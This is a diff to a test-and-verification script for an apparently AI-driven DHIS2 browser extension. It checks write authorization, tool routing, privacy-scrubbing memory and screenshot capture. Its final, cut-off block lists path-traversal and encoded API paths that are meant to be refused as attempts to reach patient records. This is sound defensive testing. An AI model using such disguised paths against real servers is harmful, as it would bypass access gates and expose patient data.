@@ -36,9 +36,9 @@ const bad = (m) => { console.log('  \x1b[31m✗\x1b[0m ' + m); failures++; };
 console.log('\nSyntax check (node --check):');
 const runtimeFiles = [
   'background.js', 'content.js', 'generate-icons.js',
-  'src/core.js', 'src/registry.js', 'src/providers.js',
+  'src/core.js', 'src/memory.js', 'src/registry.js', 'src/providers.js',
   'src/tools-metadata.js', 'src/tools-programs.js', 'src/tools-linelists.js',
-  'src/agent.js',
+  'src/tools-admin.js', 'src/tools-sqlviews.js', 'src/tools-apps.js', 'src/tools-apps-placement.js', 'src/agent.js',
   'sidepanel/panel.js',
 ];
 for (const rel of runtimeFiles) {
@@ -51,15 +51,16 @@ for (const rel of runtimeFiles) {
 // ── 2. Load the background modules under a chrome shim ───────────────────────
 console.log('\nModule load (importScripts order, one shared scope):');
 const loaderSrc = fs.readFileSync(path.join(ROOT, 'background.js'), 'utf8');
-const modules = [...loaderSrc.matchAll(/'(src\/[^']+\.js)'/g)].map((m) => m[1]);
+const modules = [...loaderSrc.matchAll(/'((?:src|libs)\/[^']+\.js)'/g)].map((m) => m[1]);
 if (!modules.length) bad('background.js declares no src/*.js modules');
 
 const noop = () => {};
 const evt = () => ({ addListener: noop, removeListener: noop, hasListener: () => false });
 const store = () => ({ get: () => Promise.resolve({}), set: () => Promise.resolve(), remove: () => Promise.resolve() });
+const messageListeners = [];
 const chrome = {
-  runtime: { id: 'verify', onMessage: evt(), onInstalled: evt(), onStartup: evt(),
-             getURL: (p) => p, getPlatformInfo: (cb) => cb && cb({ os: 'linux' }) },
+  runtime: { id: 'verify', onMessage: { ...evt(), addListener: (f) => messageListeners.push(f) }, onInstalled: evt(), onStartup: evt(),
+             getURL: (p) => 'chrome-extension://verify/' + p, getPlatformInfo: (cb) => cb && cb({ os: 'linux' }) },
   storage: { local: store(), session: store(), onChanged: evt() },
   tabs: { onUpdated: evt(), onActivated: evt(), query: () => Promise.resolve([]) },
   action: { onClicked: evt() },
@@ -72,7 +73,7 @@ const chrome = {
 const sandbox = {
   chrome, console,
   fetch: () => Promise.reject(new Error('fetch disabled in verify')),
-  URL, URLSearchParams, TextEncoder, TextDecoder,
+  URL, URLSearchParams, TextEncoder, TextDecoder, FormData, Blob, AbortController, AbortSignal,
   setTimeout, clearTimeout, setInterval, clearInterval, queueMicrotask,
   atob: (s) => Buffer.from(s, 'base64').toString('binary'),
   btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
@@ -91,7 +92,10 @@ try {
   // `dhis2` is a bundle-lexical `let`, so expose a reader for the few checks
   // that need to drive per-turn counters (the loop guards).
   vm.runInContext(bundle + '\n;globalThis.__dhis2 = () => dhis2;'
-    + '\n;globalThis.__TOOL_ROUTER = TOOL_ROUTER;',
+    + '\n;globalThis.__TOOL_ROUTER = TOOL_ROUTER;'
+    + '\n;globalThis.__realSafeDhis2Fetch = safeDhis2Fetch;' // later blocks stub ctx.safeDhis2Fetch
+    + '\n;globalThis.__memoryState = () => memoryState; globalThis.__memoryTurn = () => memoryTurn;'
+    + '\n;globalThis.WRITE_CAPABLE_TOOL_NAMES = WRITE_CAPABLE_TOOL_NAMES; globalThis.MANUAL_TOOLS = MANUAL_TOOLS; globalThis.TOOL_SUMMARIES = TOOL_SUMMARIES; globalThis.MANUAL_EXTRAS = MANUAL_EXTRAS;',
     ctx, { filename: 'background.bundle.js' });
   loaded = true;
   ok(`loaded ${modules.length} modules: ${modules.map((m) => m.replace('src/', '')).join(', ')}`);
@@ -1098,7 +1102,7 @@ if (loaded) {
       return i === -1 ? null : agentSrc.slice(i, i + len);
     };
     const cases = [
-      ["case 'DHIS2_STAGE_DETECTED'", 2000, 'detected stage is persisted'],
+      ['function applyDetectedStage', 2000, 'detected stage is persisted'],
       ['async function syncFromTab', 1200, 'tab-switch context carry is persisted'],
     ];
     for (const [marker, len, label] of cases) {
@@ -1188,10 +1192,1954 @@ if (loaded) {
   }
 }
 
+// ── Administration tools (src/tools-admin.js) + 2026-10-20 fixes ──────────────
+if (loaded) {
+  console.log('\nAdministration tools & 2026-10-20 fixes:');
+  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
+  const eq = (label, got, want) => {
+    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
+    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
+  };
+  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing`); return f; };
+
+  // Imperative write verbs authorize; the same verbs inside a complaint do not.
+  const cwa = need('classifyWriteAuthorization');
+  if (cwa) {
+    eq('"Enter 12 malaria cases for January…" authorizes', cwa('Enter 12 malaria cases for January 2026 at Agouza').scope, 'broad');
+    eq('"Reset Jane\'s password…" authorizes', cwa("Reset Jane's password to Abc12345!").scope, 'broad');
+    eq('"please mark the September form complete" authorizes', cwa('please mark the September form complete').scope, 'broad');
+    eq('"When I enter data and then submit the form it fails" stays read_only', cwa('When I enter data and then submit the form it fails').scope, 'read_only');
+    eq('"If I mark it complete the values disappear" stays read_only', cwa('If I mark it complete the values disappear').scope, 'read_only');
+    eq('"why can\'t I enter values?" stays read_only', cwa("why can't I enter values?").scope, 'read_only');
+  }
+
+  // Rule-action key aliases land on the canonical keys.
+  const nra = need('normalizeRuleActionAliases');
+  if (nra) {
+    const a1 = nra({ type: 'HIDEFIELD', data_element: 'Sample ID' });
+    eq('data_element:"Sample ID" → data_element_name', a1.data_element_name, 'Sample ID');
+    const a2 = nra({ action_type: 'SHOWWARNING', dataElement: { id: 'a3kGcGpz8FJ' }, message: 'Low' });
+    eq('dataElement:{id} → data_element_id (+type, +content)', [a2.data_element_id, a2.type, a2.content], ['a3kGcGpz8FJ', 'SHOWWARNING', 'Low']);
+    const a3 = nra({ type: 'SETMANDATORYFIELD', attribute: 'National ID' });
+    eq('attribute:"National ID" → tracked_entity_attribute_name', a3.tracked_entity_attribute_name, 'National ID');
+    const a4 = nra({ type: 'HIDEFIELD', data_element_name: 'Keep me', data_element: 'Not me' });
+    eq('an explicit canonical key is never overwritten', a4.data_element_name, 'Keep me');
+    const a5 = nra({ type: 'HIDEFIELD', field: 'Temperature' });
+    eq('UID-shaped English word "Temperature" stays a NAME', [a5.data_element_name, a5.data_element_id], ['Temperature', undefined]);
+  }
+  const cat = need('canonicalizeActionTargetNames');
+  if (cat) {
+    const act = { data_element_name: 'national id' };
+    cat(act, ['Weight'], ['National ID']);
+    eq('a TEA name given as data_element_name moves to the attribute key', [act.tracked_entity_attribute_name, act.data_element_name], ['National ID', undefined]);
+  }
+
+  // Routing: metadata translation vs app-UI translation are disjoint.
+  // (Fresh thread — the sticky-tool checks above left tools "used".)
+  try { ctx.__dhis2().toolsUsedThisThread = []; } catch { /* older bundle */ }
+  const gct = need('getContextualTools');
+  if (gct) {
+    const names = (ctxObj, text) => gct(ctxObj, text, false, null).map((t) => t.function.name);
+    let n = names({ appType: 'Maintenance' }, 'translate the TB program and its data elements into French');
+    eq('"translate the TB program…" → manage_metadata_translations', n.includes('manage_metadata_translations'), true);
+    eq('…and NOT the app-UI string tool', n.includes('manage_custom_translations'), false);
+    n = names({ appType: 'Capture' }, 'translate the Capture app buttons to Arabic');
+    eq('"translate the Capture app buttons" → manage_custom_translations', n.includes('manage_custom_translations'), true);
+    n = names({ appType: 'Dashboard' }, 'create a user account for Jane with the data entry role');
+    eq('"create a user account…" → manage_users', n.includes('manage_users'), true);
+    n = names({ appType: 'Dashboard' }, 'share this dashboard with all users');
+    eq('"share … with all users" does NOT surface manage_users', n.includes('manage_users'), false);
+    n = names({ appType: 'Aggregate Data Entry', datasetId: 'a3kGcGpz8FJ' }, 'what is missing here?');
+    eq('Data Entry app → manage_data_values', n.includes('manage_data_values'), true);
+    n = names({ appType: 'Dashboard' }, 'enter 12 malaria cases in the monthly dataset for January 2026 at Agouza');
+    eq('"enter … monthly dataset … January" → manage_data_values', n.includes('manage_data_values'), true);
+    n = names({ appType: 'Capture', programId: 'a3kGcGpz8FJ' }, 'enter a new event for this patient');
+    eq('tracker data entry does NOT surface manage_data_values', n.includes('manage_data_values'), false);
+  }
+
+  // Aggregate value coercion / periods / disaggregation matching.
+  const npi = need('normalizePeriodInput');
+  if (npi) {
+    eq('"January 2026" (Monthly) → 202601', npi('Monthly', 'January 2026'), '202601');
+    eq('"2026-03" (Monthly) → 202603', npi('Monthly', '2026-03'), '202603');
+    eq('"Q2 2026" (Quarterly) → 2026Q2', npi('Quarterly', 'Q2 2026'), '2026Q2');
+    eq('"2026 week 3" (Weekly) → 2026W3', npi('Weekly', '2026 week 3'), '2026W3');
+  }
+  const po = need('periodOrdinal');
+  if (po) eq('Monthly ordinal 202601 - 202512 = 1', po('Monthly', '202601') - po('Monthly', '202512'), 1);
+  const cdv = need('coerceDataValue');
+  if (cdv) {
+    eq('INTEGER_ZERO_OR_POSITIVE "-2" refused', !!cdv({ valueType: 'INTEGER_ZERO_OR_POSITIVE' }, '-2').problem, true);
+    eq('BOOLEAN "yes" → "true"', cdv({ valueType: 'BOOLEAN' }, 'yes').value, 'true');
+    eq('option NAME → code', cdv({ valueType: 'TEXT', optionSet: { options: [{ code: 'LOW', displayName: 'Low' }] } }, 'low').value, 'LOW');
+    eq('unknown option refused', !!cdv({ valueType: 'TEXT', optionSet: { options: [{ code: 'LOW', displayName: 'Low' }] } }, 'Plenty').problem, true);
+    eq('NUMBER "1,250" → "1250"', cdv({ valueType: 'NUMBER' }, '1,250').value, '1250');
+  }
+  const mc = need('matchCoc');
+  if (mc) {
+    const cocs = [{ id: 'aaaaaaaaaa1', displayName: 'Female, <5', categoryOptions: [{ displayName: 'Female' }, { displayName: '<5' }] },
+                  { id: 'aaaaaaaaaa2', displayName: 'Male, <5', categoryOptions: [{ displayName: 'Male' }, { displayName: '<5' }] }];
+    eq('COC by option names in any order', (mc(cocs, '<5, Female') || {}).id, 'aaaaaaaaaa1');
+    eq('COC by option array', (mc(cocs, ['<5', 'Male']) || {}).id, 'aaaaaaaaaa2');
+    eq('"Female, 5+" does NOT match "Female, <5" (symbols kept)', mc(cocs, 'Female, 5+'), null);
+    const ages = [{ id: 'bbbbbbbbbb1', displayName: '<5', categoryOptions: [{ displayName: '<5' }] }, { id: 'bbbbbbbbbb2', displayName: '5+', categoryOptions: [{ displayName: '5+' }] }];
+    eq('"5+" resolves to the 5+ band', (mc(ages, '5+') || {}).id, 'bbbbbbbbbb2');
+    eq('"<5" resolves to the <5 band', (mc(ages, '<5') || {}).id, 'bbbbbbbbbb1');
+  }
+  const hdv = need('hardenDataValueSetsPath');
+  if (hdv) {
+    eq('raw dataValueSets import gets strictPeriods', /strictPeriods=true/.test(hdv('dataValueSets')), true);
+    eq('explicit strictPeriods=false is respected', /strictPeriods=false/.test(hdv('dataValueSets?strictPeriods=false')), true);
+    eq('DELETE strategy left untouched', hdv('dataValueSets?importStrategy=DELETE'), 'dataValueSets?importStrategy=DELETE');
+  }
+
+  // Users: password policy + username shape.
+  const cp = need('checkPassword');
+  if (cp) {
+    eq('"Abc12345!" passes the policy', cp('Abc12345!', { min: 8, max: 72 }).length, 0);
+    eq('"Abcdefgh!" lacks a digit', cp('Abcdefgh!', { min: 8, max: 72 }).some((p) => /digit/.test(p)), true);
+    const gp = need('generateStrongPassword');
+    if (gp) eq('generated password satisfies the policy', cp(gp(14), { min: 8, max: 72 }).length, 0);
+  }
+  const cu = need('checkUsername');
+  if (cu) { eq('"zz_ok-name.1" is a valid username', cu('zz_ok-name.1'), null); eq('"Bad Name" refused', !!cu('Bad Name'), true); }
+
+  // Indicator types by factor.
+  const iif = need('impliedIndicatorFactor');
+  if (iif) {
+    eq('"Per cent" → factor 100', (iif('Per cent') || {}).factor, 100);
+    eq('"%" → factor 100', (iif('%') || {}).factor, 100);
+    eq('"per 100,000" → factor 100000', (iif('per 100,000') || {}).factor, 100000);
+    eq('"Number (Factor 1)" → factor 1', (iif('Number (Factor 1)') || {}).factor, 1);
+  }
+
+  // Aggregate-data delete block → data-pruning hint names the right UID.
+  const adh = need('aggregateDataBlockHint');
+  if (adh) eq('hint carries the DE UID from a metadata DELETE body', /dataPruning\/dataElements\/Sdn2X0UkIQL/.test(adh('metadata?importStrategy=DELETE {"dataElements":[{"id":"Sdn2X0UkIQL"}]}')), true);
+}
+
+// ── Learning memory (src/memory.js) ──────────────────────────────────────────
+// Async block: every await below resolves on the microtask queue, which drains
+// before the setImmediate verdict.
+if (loaded) (async () => {
+  console.log('\nLearning memory:');
+  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
+  const eq = (label, got, want) => {
+    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
+    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
+  };
+  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
+  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing`); return f; };
+  const st = ctx.__memoryState && ctx.__memoryState();
+  if (!st) { bad('memoryState not exposed'); return; }
+  await ctx.ensureMemoryLoaded();
+  st.entries = [];
+  st.enabled = true;
+
+  // Scrubbing: identifiers and personal values never reach storage.
+  const scrub = need('scrubMemoryText');
+  if (scrub) {
+    eq('UIDs → <uid>', scrub('tracker/trackedEntities/a3kGcGpz8FJ failed for CcHoHIzjuVo'), 'tracker/trackedEntities/<uid> failed for <uid>');
+    eq('API words like programType survive', scrub('set programType and periodTypes'), 'set programType and periodTypes');
+    eq('e-mail → <email>', scrub('sent to jane.doe@moh.gov.sl'), 'sent to <email>');
+    eq('phone → <number>', scrub('call +232 76 123 456'), 'call <number>');
+    eq('dates → <date>', scrub('born 1990-04-12'), 'born <date>');
+    eq('filter values → <value>', scrub('GET trackedEntities?filter=w75KJ2mc4zz:eq:Fatmata'), 'GET trackedEntities?filter=<uid>:eq:<value>');
+    eq('monthly period id survives, long ids do not', scrub('period 202601 id 12345678'), 'period 202601 id <number>');
+    eq('server URL reduced to path', scrub('https://play.dhis2.org/api/42/dashboards/abc?x=1'), '/api/dashboards/abc?x=1');
+  }
+  const personal = need('looksLikePersonalData');
+  if (personal) {
+    eq('"patient named Fatmata" is personal', personal('the patient named Fatmata could not enroll'), true);
+    eq('"Mrs Kamara" is personal', personal('record of Mrs Kamara'), true);
+    eq('"first name: Ali" is personal', personal('first name: Ali'), true);
+    eq('an API lesson is not personal', personal('PATCH users/<uid> /userGroups returns 500; use userGroups/<g>/users/<u>'), false);
+  }
+
+  // Recording through the tool: validation, privacy refusal, merge.
+  const mm = need('executeManageMemory');
+  if (mm) {
+    let r = await mm({ action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'Add tiles with add_items, never PUT the dashboard', problem: 'A PUT dashboards/<uid> with only the new item wiped every existing tile.', solution: 'Use manage_dashboards(action="add_items", dashboard_id, items=[{visualization_id}]) — it appends and snapshots first.' });
+    truthy('record a dashboard lesson', r.success && r.id);
+    r = await mm({ action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'Use add_items to add tiles, never PUT the dashboard', problem: 'PUT dashboards wiped every existing tile', solution: 'manage_dashboards add_items appends safely.' });
+    eq('a near-duplicate lesson MERGES (no second entry)', [r.merged_with_existing, st.entries.length], [true, 1]);
+    r = await mm({ action: 'record', area: 'tracker_data', title: 'Enrollment for the patient named Fatmata fails', solution: 'Use a different date for Fatmata Kamara please' });
+    truthy('a lesson with personal data is REFUSED', r._error && /personal/.test(r._error));
+    await mm({ action: 'record', area: 'indicators', tools: ['manage_indicators'], title: 'Percent indicator type is named Percentage here', problem: 'indicator_type "Per cent" does not exist on this server', solution: 'Pass indicator_type:"Percentage" (factor 100) for percentages.', scope: 'instance' });
+    await mm({ action: 'record', area: 'line_lists', tools: ['manage_line_lists'], title: 'Line list PI columns must not divide', problem: 'A division PI as a column was refused', solution: 'Use a row-safe SUM program indicator as the column.' });
+    eq('three distinct lessons stored', st.entries.length, 3);
+  }
+
+  // Retrieval is task-aware.
+  const block = need('buildMemoryPromptBlock');
+  if (block) {
+    const txt = block('create an ANC coverage indicator as a percentage then put it on a dashboard', ['manage_indicators', 'manage_dashboards', 'dhis2_query']);
+    truthy('prompt block carries the indicator lesson', /Percentage/.test(txt));
+    truthy('prompt block carries the dashboard lesson', /add_items/.test(txt));
+    truthy('prompt block leaves out the unrelated line-list lesson', !/division PI/.test(txt));
+    const none = block('how many enrollments last month?', ['count_records', 'dhis2_query']);
+    truthy('an unrelated request gets no lessons (just the search pointer)', !/add_items|Percentage/.test(none));
+  }
+  const lf = need('memoryLessonsFor');
+  if (lf) {
+    const l = lf({ tool: 'manage_dashboards', args: { action: 'add_items' }, userText: 'add a chart' });
+    truthy('manual-gate lessons for manage_dashboards found', l.length === 1 && /add_items/.test(l[0]));
+  }
+
+  // Automatic capture: failure → fix in one turn becomes a lesson.
+  const begin = need('memoryBeginTurn'), observe = need('memoryObserveCall'), end = need('memoryEndTurn');
+  if (begin && observe && end) {
+    const before = st.entries.length;
+    begin('create an indicator', { appType: 'Maintenance' }, new Set(['manage_indicators', 'manage_memory']));
+    observe('manage_indicators', { action: 'create', indicator: { name: 'X', indicator_type: 'Per thousand', numerator: '#{a}', denominator: '#{b}' } },
+      { _error: 'No indicatorType named "Per thousand".', _hint: 'Use one of this instance\'s types: "Percentage" (factor 100).' });
+    const o = observe('manage_indicators', { action: 'create', indicator: { name: 'X', indicator_type: 'Percentage', numerator: '#{a}', denominator: '#{b}' } }, { success: true, indicator_id: 'a3kGcGpz8FJ' });
+    truthy('recovery nudges the model to record the lesson', o.note && /manage_memory/.test(o.note));
+    await end();
+    const auto = st.entries.find(e => e.source === 'auto');
+    eq('an automatic lesson was written', st.entries.length, before + 1);
+    truthy('…naming the exact change (indicator_type Per thousand → Percentage)', auto && /indicator_type: Per thousand → Percentage/.test(auto.solution));
+    truthy('…without the indicator NAME or expression values', auto && !/#\{a\}/.test(JSON.stringify(auto)));
+
+    // Gate refusals are not lessons.
+    const n1 = st.entries.length;
+    begin('delete it', { appType: 'Maintenance' }, new Set());
+    observe('manage_metadata', { action: 'delete' }, { _error: 'Refused: not authorized', _scope: 'requires_user_confirmation' });
+    observe('manage_metadata', { action: 'delete' }, { success: true });
+    await end();
+    eq('write-auth refusals never become lessons', st.entries.length, n1);
+
+    // Privacy taint: a turn that touched patient records writes NOTHING.
+    begin('fix the enrollment', { appType: 'Capture', teiId: 'a3kGcGpz8FJ', programId: 'CcHoHIzjuVo' }, new Set(['manage_memory']));
+    truthy('a patient-record page taints the turn', !!ctx.__memoryTurn().taint);
+    observe('create_metadata', { action: 'add_stage' }, { _error: 'E4000 missing name' });
+    observe('create_metadata', { action: 'add_stage' }, { success: true });
+    const refused = await mm({ action: 'record', area: 'programs', title: 'Stages need a name always', solution: 'Always send the stage name field.' });
+    await end();
+    eq('tainted turn: no automatic lesson', st.entries.length, n1);
+    truthy('tainted turn: manage_memory(record) refused', refused._error && /patient-level/.test(refused._error));
+    begin('list people', { appType: 'Maintenance' }, new Set());
+    observe('dhis2_query', { path: 'tracker/trackedEntities?program=CcHoHIzjuVo' }, { _error: 'Refused by hard privacy safeguard', _privacy_block: true });
+    truthy('a patient-data read attempt taints the turn', !!ctx.__memoryTurn().taint);
+    await end();
+    begin('create a person', { appType: 'Maintenance' }, new Set());
+    observe('dhis2_query', { path: 'tracker?async=false', method: 'POST', body: { trackedEntities: [] } }, { success: true });
+    truthy('a tracker WRITE taints the turn', !!ctx.__memoryTurn().taint);
+    await end();
+  }
+
+  // "remember …" in the USER's words makes the recorded lesson a user rule.
+  if (mm) {
+    vm.runInContext('lastUserText = "Please remember for the future: always use LAST_12_MONTHS on charts";', ctx);
+    let r = await mm({ action: 'record', area: 'visualizations', tools: ['manage_dashboards'], title: 'Charts always use LAST_12_MONTHS here', solution: 'Set periods ["LAST_12_MONTHS"] on every chart.' });
+    eq('"remember …" from the user → source user (user rule)', r.lesson && r.lesson.source, 'user');
+    vm.runInContext('lastUserText = "make a chart of malaria";', ctx);
+    r = await mm({ action: 'record', area: 'maps', tools: ['manage_maps'], title: 'Maps need an org unit level for districts', solution: 'Pass org_unit_level 2 for districts on this hierarchy.' });
+    eq('a self-learned lesson stays source assistant', r.lesson && r.lesson.source, 'assistant');
+  }
+
+  // Search tool + on/off switch.
+  if (mm) {
+    const r = await mm({ action: 'search', query: 'dashboard tiles wiped' });
+    truthy('search finds the dashboard lesson', r.success && r.lessons?.[0]?.area === 'dashboards');
+  }
+  const gct = fn('getContextualTools');
+  if (gct) {
+    truthy('manage_memory is offered while memory is ON', gct({ appType: 'Dashboard' }, 'make a chart', false).some(t => t.function.name === 'manage_memory'));
+    st.enabled = false;
+    truthy('manage_memory is withheld while memory is OFF', !gct({ appType: 'Dashboard' }, 'make a chart', false).some(t => t.function.name === 'manage_memory'));
+    eq('no prompt block while memory is OFF', block ? block('put it on a dashboard', ['manage_dashboards']) : '', '');
+    begin && begin('x', {}, new Set());
+    const n2 = st.entries.length;
+    observe && observe('manage_indicators', { action: 'create' }, { _error: 'boom' });
+    observe && observe('manage_indicators', { action: 'create' }, { success: true });
+    end && await end();
+    eq('nothing is learned while memory is OFF', st.entries.length, n2);
+    st.enabled = true;
+  }
+  st.entries = [];
+})().catch((e) => bad(`learning-memory checks threw: ${e && e.stack || e}`));
+
+// ── Screenshot capture (src/agent.js) ────────────────────────────────────────
+// The manifest declares neither activeTab nor <all_urls>, so captureVisibleTab
+// is refused: the background must hand capture to the injected overlay, which
+// executeScript SERIALIZES — it may only use what it defines itself, so it runs
+// here from its source text in a fresh context with a minimal DOM. Microtask-
+// only (no real timers), like the block above. A handler that never answers
+// would leave this block pending forever, so the verdict also checks it finished.
+let screenshotChecksDone = false;
+if (loaded) (async () => {
+  console.log('\nScreenshot capture (no activeTab / <all_urls>):');
+  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
+  const flush = async () => { for (let i = 0; i < 50; i++) await Promise.resolve(); };
+  const listener = messageListeners[0];
+  if (!listener || typeof ctx.injectedScreenshotSelection !== 'function') { bad('screenshot handler / injectedScreenshotSelection missing'); return; }
+
+  // Background message handling.
+  const sent = [];
+  chrome.runtime.sendMessage = (m) => { sent.push(m); return Promise.resolve(); };
+  const fromTab = { id: 'verify', tab: { id: 7, windowId: 1 } };
+  const call = (msg, sender = fromTab) => new Promise((resolve) => {
+    if (listener(msg, sender, resolve) !== true) resolve(undefined);
+  });
+  chrome.tabs.captureVisibleTab = () => Promise.reject(new Error("Either the '<all_urls>' or 'activeTab' permission is required."));
+  const r = await call({ type: 'SCREENSHOT_AREA_SELECTED', payload: { x: 1, y: 1, width: 50, height: 50, devicePixelRatio: 1 } });
+  truthy('captureVisibleTab refused → overlay told to capture in-page', r && r.captureInPage === true);
+  truthy('…with no error shown for the refused fast path', !sent.length);
+  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' });
+  truthy('in-page PNG is relayed to the panel as SCREENSHOT_RESULT', sent.length === 1 && sent[0].type === 'SCREENSHOT_RESULT');
+  sent.length = 0;
+  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:text/html;base64,PGI+' });
+  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' }, { id: 'verify' });
+  truthy('non-PNG data / a sender that is not a tab is dropped', !sent.length);
+  await call({ type: 'SCREENSHOT_FAILED', reason: 'NotAllowedError', error: 'Permission denied' });
+  truthy('cancelled share prompt → SCREENSHOT_ERROR (not AI_ERROR, which ends a streaming reply) naming Allow',
+    sent[0]?.type === 'SCREENSHOT_ERROR' && /Allow/.test(sent[0].error));
+  delete chrome.runtime.sendMessage;
+  delete chrome.tabs.captureVisibleTab;
+
+  // The injected overlay, from its serialized source.
+  const src = ctx.injectedScreenshotSelection.toString();
+  const page = ({ activation = true, response = { captureInPage: true }, getDisplayMedia } = {}) => {
+    const msgs = [];
+    const t = { stopped: false, gdmCalls: 0, overlayGoneAtCapture: null, drawn: null };
+    const el = (tag) => {
+      const e = {
+        tag, id: '', style: {}, children: [], listeners: {},
+        addEventListener(type, f) { (this.listeners[type] ||= []).push(f); },
+        appendChild(c) { this.children.push(c); c.parent = this; },
+        remove() { if (this.parent) this.parent.children = this.parent.children.filter((x) => x !== this); },
+        fire(type, ev = {}) { for (const f of this.listeners[type] || []) f({ preventDefault: noop, ...ev }); },
+      };
+      if (tag === 'video') e.play = async () => { e.videoWidth = 2000; e.videoHeight = 1488; };
+      if (tag === 'canvas') {
+        e.getContext = () => ({ drawImage: (...a) => { t.drawn = a.slice(1); } });
+        e.toDataURL = () => 'data:image/png;base64,QUJD';
+      }
+      return e;
+    };
+    const body = el('body');
+    const track = { getSettings: () => ({ displaySurface: 'browser' }), stop: () => { t.stopped = true; } };
+    const gdm = getDisplayMedia || (async () => {
+      t.gdmCalls++;
+      t.overlayGoneAtCapture = !body.children.length;
+      return { getVideoTracks: () => [track], getTracks: () => [track] };
+    });
+    const win = {
+      document: { body, createElement: el, getElementById: (id) => body.children.find((c) => c.id === id) || null, addEventListener: noop, removeEventListener: noop },
+      innerWidth: 1000, innerHeight: 800, devicePixelRatio: 2,
+      navigator: { userActivation: { isActive: activation }, mediaDevices: getDisplayMedia === null ? undefined : { getDisplayMedia: gdm } },
+      chrome: { runtime: { sendMessage: (m) => { msgs.push(m); return Promise.resolve(m.type === 'SCREENSHOT_AREA_SELECTED' ? response : undefined); } } },
+      setTimeout: (f) => Promise.resolve().then(f),
+    };
+    win.window = win;
+    vm.runInContext(`(${src})()`, vm.createContext(win));
+    const overlay = body.children[0];
+    const drag = () => {
+      overlay.fire('mousedown', { clientX: 100, clientY: 50 });
+      overlay.fire('mousemove', { clientX: 300, clientY: 200 });
+      overlay.fire('mouseup', { clientX: 400, clientY: 250 });
+    };
+    return { t, msgs, body, drag };
+  };
+
+  let p = page();
+  p.drag();
+  await flush();
+  truthy('overlay is self-contained: runs from its serialized source', p.msgs.some((m) => m.type === 'SCREENSHOT_AREA_SELECTED'));
+  truthy('in-page capture starts only after the overlay is removed', p.t.gdmCalls === 1 && p.t.overlayGoneAtCapture === true);
+  truthy('crop maps CSS px → frame px by width (DPR 2: 100,50 300×200 → 200,100 600×400)',
+    JSON.stringify(p.t.drawn) === JSON.stringify([200, 100, 600, 400, 0, 0, 600, 400]));
+  truthy('cropped PNG sent as SCREENSHOT_CAPTURED and the stream stopped',
+    p.msgs.some((m) => m.type === 'SCREENSHOT_CAPTURED' && m.dataUrl === 'data:image/png;base64,QUJD') && p.t.stopped);
+
+  p = page({ response: { ok: true } });
+  p.drag();
+  await flush();
+  truthy('prompt-free path succeeded → no tab-capture prompt', p.t.gdmCalls === 0);
+
+  p = page({ activation: false });
+  p.drag();
+  await flush();
+  const btn = p.body.children.find((c) => c.id === '__dhis2_screenshot_confirm__');
+  truthy('expired user activation (slow drag) → "Capture selection" button, no prompt yet', btn && p.t.gdmCalls === 0);
+  btn && btn.fire('click');
+  await flush();
+  truthy('…clicking it captures and removes the button', p.t.gdmCalls === 1 && !p.body.children.length);
+
+  p = page({ getDisplayMedia: async () => { throw Object.assign(new Error('Permission denied'), { name: 'NotAllowedError' }); } });
+  p.drag();
+  await flush();
+  truthy('cancelled prompt → SCREENSHOT_FAILED NotAllowedError', p.msgs.some((m) => m.type === 'SCREENSHOT_FAILED' && m.reason === 'NotAllowedError'));
+
+  p = page({ getDisplayMedia: null });
+  p.drag();
+  await flush();
+  truthy('insecure context (no mediaDevices) → SCREENSHOT_FAILED InsecureContextError', p.msgs.some((m) => m.type === 'SCREENSHOT_FAILED' && m.reason === 'InsecureContextError'));
+  screenshotChecksDone = true;
+})().catch((e) => { screenshotChecksDone = true; bad(`screenshot checks threw: ${e && e.stack || e}`); });
+
+// ── Security & navigation hardening (core.js / providers.js / agent.js) ─────
+// Microtask-only, like the blocks above; the verdict checks it finished.
+let hardeningChecksDone = false;
+if (loaded) (async () => {
+  console.log('\nSecurity & navigation hardening:');
+  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
+  const flush = async () => { for (let i = 0; i < 50; i++) await Promise.resolve(); };
+
+  // Disguised paths: fetch() resolves these into a different endpoint than the
+  // string every gate inspected (live on 2.42: 7 forms read patient rows).
+  const amb = ctx.ambiguousApiPathReason;
+  const disguised = ['programs/../tracker/trackedEntities', './tracker/events', 'programs/%2e%2e/tracker/events',
+    'programs/.%2E/tracker/events', 'tracker/%74rackedEntities', 'tracker\\trackedEntities', 'tracker/events#', 'tracker;x=1/events'];
+  truthy('every disguised path form is refused', disguised.every((p) => amb(p)));
+  const plain = ['programs/a3kGcGpz8FJ?fields=id,programStages[id,name]', 'tracker/events.json?program=a3kGcGpz8FJ',
+    'dataStore/dhis2-ai-backups/key%20with%20space', 'analytics?dimension=dx:a3kGcGpz8FJ;b3kGcGpz8FJ&filter=pe:LAST_12_MONTHS',
+    'programIndicators/expression/description?expression=%23%7Bx%7D', 'metadata?importMode=VALIDATE'];
+  truthy('plain API paths (incl. ; and # in the QUERY, %20 in a key) are untouched', plain.every((p) => !amb(p)));
+  const d = ctx.__dhis2();
+  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion };
+  d.baseUrl = 'http://localhost:8081'; d.apiVersion = '42';
+  const r1 = await ctx.__realSafeDhis2Fetch('programs/../tracker/trackedEntities?program=a3kGcGpz8FJ');
+  truthy('safeDhis2Fetch refuses a disguised path before any request', r1 && r1._refused_path === true);
+  let threw = false;
+  try { ctx.apiUrl('trackedEntityTypes/%2e%2e/tracker/enrollments'); } catch { threw = true; }
